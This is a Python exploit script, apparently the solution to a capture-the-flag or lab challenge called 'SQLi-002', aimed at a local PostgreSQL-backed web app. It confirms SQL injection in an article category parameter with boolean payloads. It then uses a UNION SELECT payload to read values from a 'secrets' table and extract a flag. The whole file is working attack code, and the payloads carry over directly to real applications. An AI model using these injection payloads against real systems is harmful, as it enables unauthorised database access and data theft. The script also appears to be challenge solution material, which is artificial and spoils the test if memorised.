#!/usr/bin/env python3
"""
SQLi-002 Exploit Script
Logic-based SQL Injection Detection and Flag Extraction (PostgreSQL)
"""

import requests
import sys
import re

TARGET = "http://localhost:5002"

def test_logic_based():
    """Test for logic-based SQL Injection"""
    print("[*] Testing for Logic-based SQL Injection...")
    
    # Test TRUE condition
    true_payload = "technology' OR '1'='1"
    true_response = requests.get(f"{TARGET}/articles", params={"category": true_payload})
    true_count = true_response.text.count("article-card")
    
    # Test FALSE condition  
    false_payload = "technology' AND '1'='2"
    false_response = requests.get(f"{TARGET}/articles", params={"category": false_payload})
    false_count = false_response.text.count("article-card")
    
    # Normal request
    normal_response = requests.get(f"{TARGET}/articles", params={"category": "technology"})
    normal_count = normal_response.text.count("article-card")
    
    print(f"    Normal (technology): {normal_count} articles")
    print(f"    TRUE condition (OR '1'='1): {true_count} articles")
    print(f"    FALSE condition (AND '1'='2): {false_count} articles")
    
    if true_count > normal_count and false_count == 0:
        print("[+] VULNERABLE! Logic-based SQLi confirmed")
        print("[+] Database appears to be PostgreSQL")
        return True
    else:
        print("[-] Could not confirm vulnerability")
        return False

def extract_flag():
    """Extract flag using UNION-based injection"""
    print("\n[*] Extracting flag...")
    
    payload = "technology' UNION SELECT 1,secret_value,'a','a',NOW(),100 FROM secrets--"
    
    response = requests.get(f"{TARGET}/articles", params={"category": payload})
    
    # Look for flag pattern
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        return flag_match.group(0)
    
    return None

def main():
    print("=" * 60)
    print("SQLi-002 Exploit - Logic-based Detection (PostgreSQL)")
    print("=" * 60)
    
    if not test_logic_based():
        print("[-] Target does not appear to be vulnerable")
        sys.exit(1)
    
    flag = extract_flag()
    if flag:
        print(f"\n[+] FLAG FOUND: {flag}")
    else:
        print("\n[-] Could not extract flag automatically")
        print("[*] Try manual extraction with UNION SELECT")

if __name__ == "__main__":
    main()
